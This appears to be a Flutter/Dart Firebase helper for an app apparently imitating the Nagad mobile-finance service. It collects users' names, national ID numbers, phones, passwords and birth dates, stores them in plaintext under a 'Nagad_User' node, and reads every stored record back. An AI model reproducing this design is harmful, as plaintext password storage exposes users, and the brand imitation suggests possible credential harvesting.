import 'dart:convert';

import 'package:firebase_database/firebase_database.dart';
import 'package:nogod/models/data_model.dart';

class FirebaseData {
  // String? image;

  // sendImage(var images) async {
  //   var dataKye = DateTime.now().microsecond;

  //   var imagePath = await FirebaseStorage.instance
  //       .ref(
  //         "Nagad_User",
  //       )
  //       .child(
  //         "Nagad_User_$dataKye",
  //       )
  //       .putFile(File(images));
  //   image = await imagePath.ref.getDownloadURL();
  // }

  sendData(
    String name,
    String nid,
    String password,
    String phone,
    String confamPassword,
    String bith,
    String images,
  ) async {
    var dataKye = DateTime.now().microsecond;
    var user = UserInfoModel(
      name: name,
      nid: nid,
      phone: phone,
      password: password,
      confamPassword: confamPassword,
      bith: bith,
      image: images,
    );

    await FirebaseDatabase.instance
        .ref(
          "Nagad_User",
        )
        .child(
          "${phone}_${name.replaceAll(" ", "_")}_$dataKye",
        )
        .set(
          user.toJson(),
        );
  }

  // otpCode(phoneNumber, pin) async {
    
  //   await FirebaseAuth.instance.verifyPhoneNumber(
  //       phoneNumber: phoneNumber,
  //       timeout: Duration(seconds: 60),
  //       verificationCompleted: (PhoneAuthCredential credential) async {
  //         var otp =
  //             await FirebaseAuth.instance.signInWithCredential(credential);
  //         User? user = otp.user;
  //         if (user! == null) {}
  //       },
  //       verificationFailed: (FirebaseAuthException e) {
  //         print(e);
  //       },
  //       codeSent: (var verificationId, var resendToken) async {
  //         var smsOpt = pin;
  //         PhoneAuthCredential phoneAuthCredential =
  //             PhoneAuthProvider.credential(
  //                 verificationId: verificationId, smsCode: smsOpt);
  //         var otp = await FirebaseAuth.instance
  //             .signInWithCredential(phoneAuthCredential);
  //         User? user = otp.user;
  //         if (user! == null) {}
  //       },
  //       codeAutoRetrievalTimeout: (var verificationId) {});
  // }
}

class FirebaseGetData {
  Future<List<UserInfoModel>> getData() async {
  List<UserInfoModel> data = [];
  await FirebaseDatabase.instance
      .ref(
        "Nagad_User",
      )
      .orderByKey()
      .get()
      .then(
    (value) {
      for (var i in value.children) {
        data.add(
          UserInfoModel.fromJson(
            jsonDecode(
              jsonEncode(i.value),
            ),
          ),
        );
      }
    },
  );
  return data;
}
}
